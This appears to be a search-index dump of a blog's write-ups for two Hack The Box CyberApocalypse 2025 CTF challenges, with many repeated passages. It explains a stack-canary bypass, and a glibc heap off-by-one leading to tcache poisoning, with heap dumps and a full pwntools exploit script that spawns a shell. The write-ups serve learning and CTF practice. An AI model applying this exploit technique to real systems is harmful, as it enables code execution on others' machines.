    "text": "Exploitation Method (Tcache Poisoning)\nThe strategy combines the off-by-one with an Unsorted Bin leak and Tcache poisoning to overwrite __free_hook with system.\n\nLeak Libc Address (Unsorted Bin Attack):\n\nmalloc a large chunk (L) (&gt; 0x410 bytes) so it goes to the Unsorted Bin when freed.\nmalloc a small barrier chunk (prevents merging L with top chunk).\nfree(L). L is now in the Unsorted Bin, L-&gt;fd points into main_arena.\nmalloc a small chunk (S). malloc splits L, copying the main_arena pointer (from L-&gt;fd) into S‚Äôs user data area.\nRead the content of S to retrieve the leaked main_arena pointer.\nCalculate libc base address: libc_base = leaked_pointer - offset. The offset depends on the specific libc version and the exact main_arena pointer leaked (e.g., main_arena + 1104). This gives us runtime addresses for system, __free_hook, etc.\n\nHeap Setup & Metadata Corruption:\n\nAllocate several chunks to establish a predictable layout for Tcache manipulation (e.g., A(0x28), B(0x18, containing ‚Äú/bin/sh‚Äù), C(0x28), D(0x18)).\nTrigger the Off-by-One: edit(A) with 0x28 bytes, carefully choosing the last byte (e.g., \\x41 or \\x91) to overwrite the LSB of B‚Äôs size field. Change B‚Äôs size from 0x21 to an invalid-looking value like 0x41 or 0x91. This corrupted size helps bypass certain checks later.\n\nTcache Manipulation & Poisoning:\n\nFree chunks in a specific order to place the chunk with corrupted metadata (B) into the desired Tcache bin, followed by another chunk (D). Example free order: free(C), free(A), free(D), free(B).\nAfter free(B), the Tcache[0x20] bin head is B, and its fd points to D: Tcache[0x20]: B(fd=&D) -&gt; D -&gt; NULL.\nPoison Write: Allocate a new chunk (P) large enough (e.g., 0x30) whose memory location physically overlaps the metadata/data area of the now-freed chunk B. Write a payload into P: [Padding] + p64(address_of___free_hook). The padding is calculated so p64(...) overwrites the memory location where B‚Äôs fd pointer resides.\nThis implicitly poisons the Tcache list. Now: Tcache[0x20]: B(fd=&__free_hook) -&gt; D -&gt; NULL.\nmalloc(0x18): Returns chunk B (from Tcache head).\nmalloc(0x18): Follows the poisoned fd pointer and returns address_of___free_hook.\n\nOverwrite __free_hook & Trigger Execution:\n\nThe second malloc(0x18) returned a pointer to __free_hook. Let‚Äôs say this pointer corresponds to chunk index hook_idx.\nedit(hook_idx): Write the address of system (calculated from the libc leak) into this chunk. This directly overwrites the __free_hook function pointer.\nfree(B): Free the chunk that contains /bin/sh (original chunk B). The free function first calls the hook. Since __free_hook now points to system, this executes system(\"/bin/sh\").\n\nAchieve Shell."
  },
  {
    "objectID": "blogs/my-first-post.html#conclusion-1",
    "href": "blogs/my-first-post.html#conclusion-1",
    "title": "Matej Olexa",
    "section": "Conclusion",
    "text": "Conclusion\nThis deep dive demonstrated how an off-by-one heap overflow, often considered a minor vulnerability, can be a powerful primitive for modern heap exploitation. By carefully corrupting metadata to interfere with heap management logic, leaking a libc address via the Unsorted Bin, and executing a Tcache poisoning attack, we gained control over the __free_hook function pointer, leading to arbitrary code execution. This process highlights the intricate nature of heap manipulation and the importance of understanding allocator internals. ```"
  },
  {
    "objectID": "blogs/my-first-post.html#blog-post-1",
    "href": "blogs/my-first-post.html#blog-post-1",
    "title": "Matej Olexa",
    "section": "",
    "text": "# Exploiting Stack Pointer Corruption to Bypass Canaries\n\nStack buffer overflows are a classic vulnerability class, but modern defenses like Stack Canaries, NX, and PIE complicate exploitation. Standard overflows that overwrite the return address often corrupt the canary, causing the program to terminate. This post analyzes a specific binary (`contractor`) that demonstrates an interesting technique to bypass stack canaries by corrupting a stack-based pointer *during* the overflow, redirecting subsequent writes to bypass the canary and overwrite the return address.\n\nThis analysis focuses on stack vulnerabilities. For an example of heap exploitation, see the companion post on [Tcache Poisoning via Off-by-One](link-to-strategist-post.md). ## Binary Analysis Context\n\nThe subject of this analysis is a 64-bit ELF binary. Key security mitigations enabled are:\n\n```text\n[*] './contractor'\nArch:       amd64-64-little\nRELRO:      Full RELRO\nStack:      Canary found\nNX:         NX enabled\nPIE:        PIE enabled\nRUNPATH:    b'./glibc/'\nSHSTK:      Enabled\nIBT:        Enabled\nStripped:   No\nThe binary takes user details (name, reason, age, specialty) and allows editing them. The core vulnerabilities lie in how the ‚Äòspecialty‚Äô field is handled. A function named contract exists, which simply calls execl(\"/bin/sh\", \"sh\", 0), making it an ideal target for control flow hijacking.\nint64_t contract() {\n     // Simplified - includes canary check logic before/after execl\n     execl(\"/bin/sh\", \"sh\", 0); // The goal\n     // ... canary check failure calls __stack_chk_fail() ...\n}"
  },
  {
    "objectID": "blogs/my-first-post.html#blocyberapocalypse-2025---exploiting-stack-pointer-corruption-to-bypass-canaries",
    "href": "blogs/my-first-post.html#blocyberapocalypse-2025---exploiting-stack-pointer-corruption-to-bypass-canaries",
    "title": "Matej Olexa",
    "section": "",
    "text": "# Exploiting Stack Pointer Corruption to Bypass Canaries\n\nStack buffer overflows are a classic vulnerability class, but modern defenses like Stack Canaries, NX, and PIE complicate exploitation. Standard overflows that overwrite the return address often corrupt the canary, causing the program to terminate. This post analyzes a specific binary (`contractor`) that demonstrates an interesting technique to bypass stack canaries by corrupting a stack-based pointer *during* the overflow, redirecting subsequent writes to bypass the canary and overwrite the return address.\n\nThis analysis focuses on stack vulnerabilities. For an example of heap exploitation, see the companion post on [Tcache Poisoning via Off-by-One](link-to-strategist-post.md). ## Binary Analysis Context\n\nThe subject of this analysis is a 64-bit ELF binary. Key security mitigations enabled are:\n\n```text\n[*] './contractor'\nArch:       amd64-64-little\nRELRO:      Full RELRO\nStack:      Canary found\nNX:         NX enabled\nPIE:        PIE enabled\nRUNPATH:    b'./glibc/'\nSHSTK:      Enabled\nIBT:        Enabled\nStripped:   No\nThe binary takes user details (name, reason, age, specialty) and allows editing them. The core vulnerabilities lie in how the ‚Äòspecialty‚Äô field is handled. A function named contract exists, which simply calls execl(\"/bin/sh\", \"sh\", 0), making it an ideal target for control flow hijacking.\nint64_t contract() {\n     // Simplified - includes canary check logic before/after execl\n     execl(\"/bin/sh\", \"sh\", 0); // The goal\n     // ... canary check failure calls __stack_chk_fail() ...\n}"
  },
  {
    "objectID": "blogs/my-first-post.html#cyberapocalypse-2025---exploiting-stack-pointer-corruption-to-bypass-canaries",
    "href": "blogs/my-first-post.html#cyberapocalypse-2025---exploiting-stack-pointer-corruption-to-bypass-canaries",
    "title": "Matej Olexa",
    "section": "",
    "text": "# Exploiting Stack Pointer Corruption to Bypass Canaries\n\nStack buffer overflows are a classic vulnerability class, but modern defenses like Stack Canaries, NX, and PIE complicate exploitation. Standard overflows that overwrite the return address often corrupt the canary, causing the program to terminate. This post analyzes a specific binary (`contractor`) that demonstrates an interesting technique to bypass stack canaries by corrupting a stack-based pointer *during* the overflow, redirecting subsequent writes to bypass the canary and overwrite the return address.\n\nThis analysis focuses on stack vulnerabilities. For an example of heap exploitation, see the companion post on [Tcache Poisoning via Off-by-One](link-to-strategist-post.md). ## Binary Analysis Context\n\nThe subject of this analysis is a 64-bit ELF binary. Key security mitigations enabled are:\n\n```text\n[*] './contractor'\nArch:       amd64-64-little\nRELRO:      Full RELRO\nStack:      Canary found\nNX:         NX enabled\nPIE:        PIE enabled\nRUNPATH:    b'./glibc/'\nSHSTK:      Enabled\nIBT:        Enabled\nStripped:   No\nThe binary takes user details (name, reason, age, specialty) and allows editing them. The core vulnerabilities lie in how the ‚Äòspecialty‚Äô field is handled. A function named contract exists, which simply calls execl(\"/bin/sh\", \"sh\", 0), making it an ideal target for control flow hijacking.\nint64_t contract() {\n     // Simplified - includes canary check logic before/after execl\n     execl(\"/bin/sh\", \"sh\", 0); // The goal\n     // ... canary check failure calls __stack_chk_fail() ...\n}"
  },
  {
    "objectID": "blogs/my-first-post.html#cyberapocalypse-2025---contractor--",
    "href": "blogs/my-first-post.html#cyberapocalypse-2025---contractor--",
    "title": "Matej Olexa",
    "section": "",
    "text": "# Exploiting Stack Pointer Corruption to Bypass Canaries\n\nStack buffer overflows are a classic vulnerability class, but modern defenses like Stack Canaries, NX, and PIE complicate exploitation. Standard overflows that overwrite the return address often corrupt the canary, causing the program to terminate. This post analyzes a specific binary (`contractor`) that demonstrates an interesting technique to bypass stack canaries by corrupting a stack-based pointer *during* the overflow, redirecting subsequent writes to bypass the canary and overwrite the return address.\n\nThis analysis focuses on stack vulnerabilities. For an example of heap exploitation, see the companion post on [Tcache Poisoning via Off-by-One](link-to-strategist-post.md). ## Binary Analysis Context\n\nThe subject of this analysis is a 64-bit ELF binary. Key security mitigations enabled are:\n\n```text\n[*] './contractor'\nArch:       amd64-64-little\nRELRO:      Full RELRO\nStack:      Canary found\nNX:         NX enabled\nPIE:        PIE enabled\nRUNPATH:    b'./glibc/'\nSHSTK:      Enabled\nIBT:        Enabled\nStripped:   No\nThe binary takes user details (name, reason, age, specialty) and allows editing them. The core vulnerabilities lie in how the ‚Äòspecialty‚Äô field is handled. A function named contract exists, which simply calls execl(\"/bin/sh\", \"sh\", 0), making it an ideal target for control flow hijacking.\nint64_t contract() {\n     // Simplified - includes canary check logic before/after execl\n     execl(\"/bin/sh\", \"sh\", 0); // The goal\n     // ... canary check failure calls __stack_chk_fail() ...\n}"
  },
  {
    "objectID": "blogs/my-first-post.html#binary-analysis-context",
    "href": "blogs/my-first-post.html#binary-analysis-context",
    "title": "CyberApocalypse 2025 - Contractor: Exploiting Stack Pointer Corruption to Bypass Canaries",
    "section": "Binary Analysis Context",
    "text": "Binary Analysis Context\nThe subject of this analysis is a 64-bit ELF binary. Key security mitigations enabled are:\n[*] './contractor'\nArch:       amd64-64-little\nRELRO:      Full RELRO\nStack:      Canary found\nNX:         NX enabled\nPIE:        PIE enabled\nRUNPATH:    b'./glibc/'\nSHSTK:      Enabled\nIBT:        Enabled\nStripped:   No\nThe binary takes user details (name, reason, age, specialty) and allows editing them. The core vulnerabilities lie in how the ‚Äòspecialty‚Äô field is handled. A function named contract exists, which simply calls execl(\"/bin/sh\", \"sh\", 0), making it an ideal target for control flow hijacking.\nint64_t contract() {\n     // Simplified - includes canary check logic before/after execl\n     execl(\"/bin/sh\", \"sh\", 0); // The goal\n     // ... canary check failure calls __stack_chk_fail() ...\n}"
  },
  {
    "objectID": "blogs/my-first-post.html#section",
    "href": "blogs/my-first-post.html#section",
    "title": "CyberApocalypse 2025 - Contractor: Exploiting Stack Pointer Corruption to Bypass Canaries",
    "section": "",
    "text": "Stack buffer overflows are a classic vulnerability class, but modern defenses like Stack Canaries, NX, and PIE complicate exploitation. Standard overflows that overwrite the return address often corrupt the canary, causing the program to terminate. This post analyzes a specific binary (contractor) from the Hack The Box CyberApocalypse 2025 CTF that demonstrates an interesting technique to bypass stack canaries by corrupting a stack-based pointer during the overflow, redirecting subsequent writes to bypass the canary and overwrite the return address."
  },
  {
    "objectID": "blogs/my-first-post.html#exploiting-stack-pointer-corruption-to-bypass-canaries",
    "href": "blogs/my-first-post.html#exploiting-stack-pointer-corruption-to-bypass-canaries",
    "title": "CyberApocalypse 2025 - Contractor: Exploiting Stack Pointer Corruption to Bypass Canaries",
    "section": "",
    "text": "Stack buffer overflows are a classic vulnerability class, but modern defenses like Stack Canaries, NX, and PIE complicate exploitation. Standard overflows that overwrite the return address often corrupt the canary, causing the program to terminate. This post analyzes a specific binary (contractor) from the Hack The Box CyberApocalypse 2025 CTF that demonstrates an interesting technique to bypass stack canaries by corrupting a stack-based pointer during the overflow, redirecting subsequent writes to bypass the canary and overwrite the return address."
  },
  {
    "objectID": "blogs/my-first-post.html#binary-analysis",
    "href": "blogs/my-first-post.html#binary-analysis",
    "title": "CyberApocalypse 2025 - Contractor: Exploiting Stack Pointer Corruption to Bypass Canaries",
    "section": "",
    "text": "The subject of this analysis is a 64-bit ELF binary. Key security mitigations enabled are:\n[*] './contractor'\nArch:       amd64-64-little\nRELRO:      Full RELRO\nStack:      Canary found\nNX:         NX enabled\nPIE:        PIE enabled\nRUNPATH:    b'./glibc/'\nSHSTK:      Enabled\nIBT:        Enabled\nStripped:   No\nThe binary takes user details (name, reason, age, specialty) and allows editing them. The core vulnerabilities lie in how the ‚Äòspecialty‚Äô field is handled. A function named contract exists, which simply calls execl(\"/bin/sh\", \"sh\", 0), making it an ideal target for control flow hijacking.\nint64_t contract() {\n     // Simplified - includes canary check logic before/after execl\n     execl(\"/bin/sh\", \"sh\", 0); // The goal\n     // ... canary check failure calls __stack_chk_fail() ...\n}"
  },
  {
    "objectID": "blogs/my-first-post.html#i",
    "href": "blogs/my-first-post.html#i",
    "title": "CyberApocalypse 2025 - Contractor: Exploiting Stack Pointer Corruption to Bypass Canaries",
    "section": "",
    "text": "Stack buffer overflows are a classic vulnerability class, but modern defenses like Stack Canaries, NX, and PIE complicate exploitation. Standard overflows that overwrite the return address often corrupt the canary, causing the program to terminate. This post analyzes a specific binary (contractor) from the Hack The Box CyberApocalypse 2025 CTF that demonstrates an interesting technique to bypass stack canaries by corrupting a stack-based pointer during the overflow, redirecting subsequent writes to bypass the canary and overwrite the return address."
  },
  {
    "objectID": "blogs/strategist.html",
    "href": "blogs/strategist.html",
    "title": "HTB CyberApocalypse 2025 - Strategist: Heap Exploitation via Off-by-One and Tcache Poisoning",
    "section": "",
    "text": "Heap exploitation often involves subtle vulnerabilities that corrupt metadata, leading to powerful control over memory allocation. This post explores heap exploitation techniques using the strategist challenge from Hack The Box CyberApocalypse 2025 (March 21-26) as a case study. We‚Äôll examine how an off-by-one heap overflow vulnerability discovered in the binary was leveraged to perform a Tcache poisoning attack, ultimately leading to arbitrary code execution by overwriting __free_hook.\n\n\nThe challenge presented the strategist binary and remote access, setting the scene with:\n\n‚ÄúTo move forward, Sir Alaric requests each member of his team to present their most effective planning strategy. The individual with the strongest plan will be appointed as the Strategist for the upcoming war. Put forth your best effort to claim the role of Strategist!‚Äù\n\nThe binary allows managing ‚Äúplans‚Äù via dynamic memory allocation (malloc, free, etc.). Security mitigations present a typical modern challenge:\n[*] './strategist'\nArch:       amd64-64-little\nRELRO:      Full RELRO\nStack:      Canary found\nNX:         NX enabled\nPIE:        PIE enabled\nRUNPATH:    b'./glibc/'\nStripped:   No\nFull RELRO prevents easy GOT overwrites, PIE necessitates an information leak (like a libc address), and NX prevents executing shellcode directly on the stack or heap. The core vulnerability lies in the edit_plan functionality.\n\n\n\nThe edit_plan function determines the number of bytes to read for updating a plan based on the strlen of the current content of that plan‚Äôs chunk. It then reads exactly that many bytes using the read syscall.\n// Simplified C representation of vulnerable edit logic\nuint64_t nbytes = strlen(*(char **)(plan_array_ptr + (long)plan_index * 8)); // Get length of CURRENT content\nread(0, *(void **)(plan_array_ptr + (long)plan_index * 8), nbytes); // Read EXACTLY nbytes\nThe Flaw: The read syscall does not append a null terminator. If the user provides input such that strlen returns the exact capacity of the user data area for a given chunk (e.g., 0x28 bytes for a chunk allocated with malloc(0x28)), the subsequent read call will write exactly 0x28 bytes. This write operation overwrites the allocated buffer and the single byte immediately following it in memory.\nMetadata Impact: In glibc‚Äôs heap (ptmalloc), chunks allocated via malloc are often laid out contiguously. Directly following Chunk A‚Äôs user data area is the metadata header for the next adjacent chunk (Chunk B). This header contains fields like the chunk‚Äôs size. The off-by-one write from editing Chunk A can therefore corrupt the metadata of Chunk B, specifically overwriting the Least Significant Byte (LSB) of its size field.\nDemonstration (Heap Dumps): Let‚Äôs visualize this using gef heap dumps from the analysis process. Assume Chunk A (data XXXX...) and Chunk B (data YYYY...) are adjacent, both allocated with size 0x28 (metadata size field 0x31 including the PREV_INUSE flag).\nHeap Before Overflow:\ngef&gt;  x/20xg &lt;address_of_chunk_A_metadata&gt;\n# ... (Chunk A metadata header, size 0x31) ...\n0x...e6a0: 0x5858585858585858  0x5858585858585858  &lt;- Chunk A User Data (XXXX...)\n0x...e6b0: 0x5858585858585858  0x5858585858585858\n0x...e6c0: 0x0000000000000000  0x0000000000000031  &lt;- Chunk B Metadata Header (Size=0x31)\n0x...e6d0: 0x5959595959595959  0x5959595959595959  &lt;- Chunk B User Data (YYYY...)\n# ...\nHeap After Editing Chunk A with 0x28 ‚ÄôA‚Äôs (no null terminator):\ngef&gt;  x/20xg &lt;address_of_chunk_A_metadata&gt;\n# ... (Chunk A metadata header, size 0x31) ...\n0x...e6a0: 0x4141414141414141  0x4141414141414141  &lt;- Chunk A User Data (AAAA...)\n0x...e6b0: 0x4141414141414141  0x4141414141414141\n0x...e6c0: 0x4141414141414141  0x0000000000000041  &lt;- Chunk B Metadata Header (Size CORRUPTED: 0x31 -&gt; 0x41)\n0x...e6d0: 0x5959595959595959  0x5959595959595959  &lt;- Chunk B User Data (YYYY...)\n# ...\nThe last ‚ÄòA‚Äô written overflowed by one byte, changing the size field at 0x...e6c8 from 0x31 to 0x41. By controlling this last byte (e.g., sending 0x27 * 'A' + '\\x91'), we can set the corrupted size precisely (e.g., to 0x91). This corruption is crucial because it can bypass heap consistency checks performed by free and interfere with chunk consolidation logic.\n\n\n\nExploiting this requires understanding relevant glibc heap mechanisms (particularly relevant for versions &gt;= 2.26 which introduced Tcache):\n\nTcache (Thread-Local Cache):\n\nA performance optimization providing per-thread caches for recently freed small chunks (typically up to size 0x408).\nConsists of multiple bins, each holding chunks of a specific size.\nEach bin is a singly-linked LIFO (Last-In, First-Out) list, using the fd (forward) pointer within the freed chunk‚Äôs user data area to point to the next entry.\nA bin can hold a maximum of 7 chunks.\nmalloc checks the corresponding Tcache bin first before resorting to other bins or requesting memory from the system.\nCrucially, Tcache prioritizes speed and has fewer security checks compared to older bins, making it vulnerable to attacks like double-free, use-after-free, and poisoning of the fd pointer.\n\nUnsorted Bin:\n\nActs as a central, temporary cache (a global, doubly-linked list using fd and bk pointers) for freed chunks that don‚Äôt immediately go into Tcache (e.g., they are too large, or the relevant Tcache bin is full).\nChunks are processed later from the unsorted bin ‚Äì they might be consolidated with adjacent free chunks or moved to appropriate small/large bins.\nLibc Leak Source: While a chunk resides in the unsorted bin, its fd and bk pointers point into the main_arena structure within libc. If an attacker can read the contents of a chunk after it has been placed in the unsorted bin (e.g., by partially reallocating it), these pointers can be leaked, revealing runtime addresses within libc and defeating ASLR for the library.\n\nTcache Poisoning Attack:\n\nThe core technique used in this exploit.\nLeverages a vulnerability (like our off-by-one, or others like use-after-free/double-free) to overwrite the fd pointer of a chunk currently residing in a Tcache bin‚Äôs free list.\nThe attacker overwrites the fd pointer with the address of a target location (e.g., &__free_hook, a GOT entry, or another sensitive address).\nWhen malloc is subsequently called for that chunk size, it will:\n\nReturn the first chunk from the Tcache bin (the one whose fd pointer was overwritten).\nOn the next malloc call for the same size, follow the poisoned fd pointer and return the attacker-chosen target address.\n\nThis effectively gives the attacker a write-what-where primitive: malloc returns a pointer to the target, and subsequent input/editing can write arbitrary data there.\n\n\n\n\n\nThe exploit combines the off-by-one, Unsorted Bin leak, and Tcache poisoning:\n\nLeaking a Libc Address (Unsorted Bin Attack):\n\n\nAllocate a large chunk (L), sized specifically so it won‚Äôt fit in Tcache (e.g., &gt; 0x410 bytes).\n\n\nAllocate a small ‚Äúbarrier‚Äù chunk immediately after L. This prevents L from merging with the wilderness (top chunk) when freed.\n\n\nfree(L). Since L is large, it‚Äôs placed into the Unsorted Bin. Its fd and bk pointers now point into libc‚Äôs main_arena.\n\n\nAllocate a new small chunk (S). malloc often satisfies small requests by splitting larger chunks from the Unsorted Bin. When L is split, the main_arena pointer (originally in L-&gt;fd) is copied into the user data area of the newly allocated chunk S.\n\n\nUse the program‚Äôs show functionality to read the contents of S. Extract the leaked main_arena pointer. Calculate the libc base address by subtracting the known offset of main_arena (relative to the leak point) from the leaked address. This defeats ASLR for libc, giving us the runtime addresses of system, __free_hook, etc.\n\n\nHeap Setup and Metadata Corruption:\n\n\nAllocate several small chunks with distinct patterns (e.g., A(0x28, ‚ÄòAAAA‚Äô), B(0x18, ‚Äò/bin/sh‚Äô), C(0x28, ‚ÄòCCCC‚Äô), D(0x18, ‚ÄòDDDD‚Äô)). This careful setup arranges the heap for the Tcache manipulation and makes debugging easier.\n\n\nTrigger the Off-by-One Vulnerability: Use the edit function on chunk A. Provide exactly 0x28 bytes of input, ending with a carefully chosen byte (like \\x41 or \\x91). This overwrites the LSB of the adjacent chunk B‚Äôs size field, changing its size from 0x21 to 0x41 (or 0x91). This corrupted size is important mainly to prevent free from attempting to consolidate B with adjacent chunks later, which could disrupt the Tcache state.\n\n\nTcache Manipulation and Hook Overwrite:\n\n\nFree chunks in a specific order to manipulate the Tcache lists. To target the Tcache[0x20] bin (for chunks of size 0x18 + metadata), a potential order is: free(C) (idx 3), free(A) (idx 1), free(D) (idx 4), then free(B) (idx 2). This sequence aims to place B (the chunk with the corrupted size field) at the head of the Tcache[0x20] list, with its fd pointing to the previously freed chunk D. State: Tcache[0x20]: B(fd=&D) -&gt; D -&gt; NULL.\n\n\nPoison the fd Pointer: Allocate a new chunk (P), ensuring its size (e.g., 0x28) and position on the heap cause it to physically overlap the memory previously occupied by the now-freed chunk B. Write a payload into P consisting of padding followed by the target address: [Padding] + p64(address_of___free_hook). The padding must be precisely calculated so that the p64 write overwrites the memory location where B‚Äôs fd pointer is stored within the Tcache metadata structure.\n\n\nRetrieve Target Address: Allocate a chunk of size 0x18. malloc returns chunk B from the head of the Tcache[0x20] list. Allocate another chunk of size 0x18. malloc now follows the poisoned fd pointer (which points to __free_hook) and returns the address &__free_hook.\n\n\nOverwrite Hook: The pointer returned by the second malloc(0x18) points directly to __free_hook. Use the program‚Äôs edit functionality on the chunk associated with this pointer. Write the address of the system function (calculated using the leaked libc base) into this chunk. This directly overwrites the __free_hook function pointer itself with &system.\n\n\nTriggering Code Execution:\n\n\nFree the chunk containing the command string ‚Äú/bin/sh‚Äù (original chunk B, index 2 in our setup).\n\n\nWhen free() is called, the glibc implementation first checks if __free_hook is non-NULL. Since we overwrote it with the address of system, the hook is called.\n\n\nThe hook (system) is called with the address of the chunk being freed (B, containing ‚Äú/bin/sh‚Äù) as its argument.\n\n\nThis results in the execution of system(\"/bin/sh\"), spawning a shell and giving the attacker control.\n\n\n\n\n\n\n#!/usr/bin/python3\nfrom pwn import *\n\n# --- Setup (Connect, ELF/Libc info) ---\ncontext.arch = 'amd64'\ncontext.log_level = 'info' # Use 'debug' for more verbose heap info\ntarget = './strategist'\nlibc_path = './glibc/libc.so.6' # Adjust path to provided libc\n# connection = remote(host, port) # For remote target\nconnection = process(target, env={\"LD_PRELOAD\": libc_path}) # For local testing\nelf = ELF(target)\nlibc = ELF(libc_path)\n\n# --- Helper Functions (create, show, edit, delete) ---\ndef create(size, data):\n    connection.sendlineafter(b'&gt; ', b'1')\n    connection.sendlineafter(b'&gt; ', str(size).encode())\n    connection.sendafter(b'&gt; ', data)\n\ndef show(idx):\n    connection.sendlineafter(b'&gt; ', b'2')\n    connection.sendlineafter(b'&gt; ', str(idx).encode())\n    connection.recvuntil(f'Plan [{idx}]: '.encode())\n    return connection.recvline()\n\ndef edit(idx, data):\n    connection.sendlineafter(b'&gt; ', b'3')\n    connection.sendlineafter(b'&gt; ', str(idx).encode())\n    connection.sendafter(b'&gt; ', data)\n\ndef delete(idx):\n    connection.sendlineafter(b'&gt; ', b'4')\n    connection.sendlineafter(b'&gt; ', str(idx).encode())\n# --- End Helpers ---\n\n# --- 1. Libc Leak (Unsorted Bin) ---\nlog.info(\"Performing Libc Leak via Unsorted Bin...\")\ncreate(0x418, b'L'*8)       # Idx 0: Large chunk (L)\ncreate(0x18, b'Barrier'*2) # Idx 1: Barrier chunk\ndelete(0)                  # Free(L) -&gt; goes to Unsorted Bin\ncreate(0x18, b'S'*8)       # Idx 0: Reallocate small (S), gets split from L\nleak_data = show(0).strip()\n# Adjust parsing based on actual output structure if needed\nleaked_addr = u64(leak_data[len(b'S'*8):].ljust(8, b'\\x00'))\n# Offset calculation depends heavily on libc version and leak point.\n# This example assumes leak is main_arena + 1104 for libc 2.31\nmain_arena_offset = 1104\nlibc.address = leaked_addr - (libc.symbols['main_arena'] + main_arena_offset)\nlog.success(f\"Libc base: {hex(libc.address)}\")\nlog.info(f\"System @ {hex(libc.symbols.system)}\")\nlog.info(f\"__free_hook @ {hex(libc.symbols.__free_hook)}\")\n\n# --- 2. Heap Setup & Metadata Corruption ---\nlog.info(\"Setting up heap and triggering off-by-one...\")\ncreate(0x28, b'A'*0x28)       # Idx 1: Chunk A (size 0x30)\ncreate(0x18, b'/bin/sh\\x00') # Idx 2: Chunk B (size 0x20) &lt;- Holds command\ncreate(0x28, b'C'*0x28)       # Idx 3: Chunk C (size 0x30)\ncreate(0x18, b'D'*0x18)       # Idx 4: Chunk D (size 0x20) &lt;- Dummy Tcache entry\n# Trigger off-by-one by editing A (idx 1) to corrupt B's (idx 2) size LSB\n# Use \\x41 to change size 0x21 -&gt; 0x41. \\x91 would make it 0x91 etc.\nedit(1, b'A' * 0x28 + b'\\x41')\nlog.info(\"Chunk B's size potentially corrupted.\")\n\n# --- 3. Tcache Manipulation & Poisoning ---\nlog.info(\"Freeing chunks to prime Tcache[0x20] and poisoning...\")\n# Free order: C, A (fill Tcache[0x30]), D, B (fill Tcache[0x20])\ndelete(3) # Free C(idx 3) -&gt; Tcache[0x30]\ndelete(1) # Free A(idx 1) -&gt; Tcache[0x30]\ndelete(4) # Free D(idx 4) -&gt; Tcache[0x20] = D -&gt; NULL\ndelete(2) # Free B(idx 2) -&gt; Tcache[0x20] = B -&gt; D -&gt; NULL\n\n# Poison Write: Allocate chunk P (idx 1) overlapping B's old location.\n# Payload must overwrite the memory where B-&gt;fd was stored.\n# Padding calculation might be needed depending on exact chunk layout/libc.\n# Assuming 0x18 bytes of padding reaches the fd pointer for a 0x28 chunk.\ncreate(0x28, b'P'*0x18 + p64(libc.symbols.__free_hook)) # Poison B's fd\nlog.info(\"Tcache[0x20] poisoned: B-&gt;fd now points to __free_hook\")\n\nlog.info(\"Allocating twice from Tcache[0x20]...\")\n# First allocation gets the space of chunk B\ncreate(0x18, b'X'*8) # Idx 2: Re-allocates B's space\n# Second allocation follows the poisoned fd pointer\n# It returns a pointer to __free_hook, write system address there directly.\ncreate(0x18, p64(libc.symbols.system)) # Idx 3: Allocates AT __free_hook, writes &system\n\nlog.info(\"__free_hook overwritten with system().\")\n\n# --- 4. Trigger Execution ---\nlog.info(\"Triggering hook by freeing chunk containing '/bin/sh'...\")\n# We need to free the chunk containing \"/bin/sh\".\n# Find the current index of the chunk holding \"/bin/sh\".\n# If original chunk B (idx 2) was overwritten by the 'X'*8 allocation,\n# we need to use another chunk. Let's re-create it if needed.\n# Assuming we need to create a new one:\ncreate(0x18, b'/bin/sh\\x00') # Idx 4: Ensure /bin/sh exists\ndelete(4) # Free this chunk -&gt; system(\"/bin/sh\") executed\n\n\n# --- 5. Interact ---\nlog.success(\"Shell popped?\")\nconnection.interactive()\nNote: Heap exploitation, especially involving Tcache, is highly sensitive to the libc version and the exact sequence of allocations/frees. The indices, sizes, padding, and offsets in the code snippet are illustrative based on common patterns and the provided analysis; they may require careful adjustment and debugging against the specific target environment using tools like gdb with gef or pwndbg.\n\n\n\nThis deep dive into the strategist challenge demonstrated how an off-by-one heap overflow, often considered a minor vulnerability, can be a powerful primitive for modern heap exploitation. By carefully corrupting metadata to interfere with heap management logic, leaking a libc address via the Unsorted Bin, and executing a Tcache poisoning attack, control over the __free_hook function pointer was gained, leading to arbitrary code execution. This process highlights the intricate nature of heap manipulation and the critical importance of understanding glibc heap allocator internals for identifying and exploiting such vulnerabilities."
  },
  {
    "objectID": "blogs/strategist.html#blog-post-2-heap-exploitation-deep-dive-tcache-poisoning-via-off-by-one",
    "href": "blogs/strategist.html#blog-post-2-heap-exploitation-deep-dive-tcache-poisoning-via-off-by-one",
    "title": "Matej Olexa",
    "section": "",
    "text": "# Heap Exploitation Deep Dive: Tcache Poisoning via Off-by-One\n\nHeap exploitation often involves subtle vulnerabilities that corrupt metadata, leading to powerful control over memory allocation. This post explores how a seemingly minor off-by-one heap overflow can be escalated into a full Tcache poisoning attack to achieve arbitrary code execution. We'll analyze a specific binary (`strategist`) to illustrate the steps involved, including leaking a `libc` address and overwriting the `__free_hook`.\n\nThis analysis focuses on heap vulnerabilities. For an example of stack exploitation, see the companion post on [Exploiting Stack Pointer Corruption to Bypass Canaries](link-to-contractor-post.md). ## Binary Analysis Context\n\nThe target is a 64-bit ELF binary that manages user-defined \"plans\" using dynamic memory allocation (`malloc`, `free`, etc.). Security mitigations include:\n\n```text\n[*] './strategist'\nArch:       amd64-64-little\nRELRO:      Full RELRO\nStack:      Canary found\nNX:         NX enabled\nPIE:        PIE enabled\nRUNPATH:    b'./glibc/'\nStripped:   No\nFull RELRO prevents easy GOT overwrites, and PIE necessitates an information leak. The core vulnerability lies in the edit_plan functionality."
  },
  {
    "objectID": "blogs/strategist.html#vulnerability-off-by-one-heap-overflow---metadata-corruption",
    "href": "blogs/strategist.html#vulnerability-off-by-one-heap-overflow---metadata-corruption",
    "title": "HTB CyberApocalypse 2025 - Strategist: Heap Exploitation via Off-by-One and Tcache Poisoning",
    "section": "",
    "text": "The edit_plan function determines the number of bytes to read for updating a plan based on the strlen of the current content of that plan‚Äôs chunk. It then reads exactly that many bytes using the read syscall.\n// Simplified C representation of vulnerable edit logic\nuint64_t nbytes = strlen(*(char **)(plan_array_ptr + (long)plan_index * 8)); // Get length of CURRENT content\nread(0, *(void **)(plan_array_ptr + (long)plan_index * 8), nbytes); // Read EXACTLY nbytes\nThe Flaw: The read syscall does not append a null terminator. If the user provides input such that strlen returns the exact capacity of the user data area for a given chunk (e.g., 0x28 bytes for a chunk allocated with malloc(0x28)), the subsequent read call will write exactly 0x28 bytes. This write operation overwrites the allocated buffer and the single byte immediately following it in memory.\nMetadata Impact: In glibc‚Äôs heap (ptmalloc), chunks allocated via malloc are often laid out contiguously. Directly following Chunk A‚Äôs user data area is the metadata header for the next adjacent chunk (Chunk B). This header contains fields like the chunk‚Äôs size. The 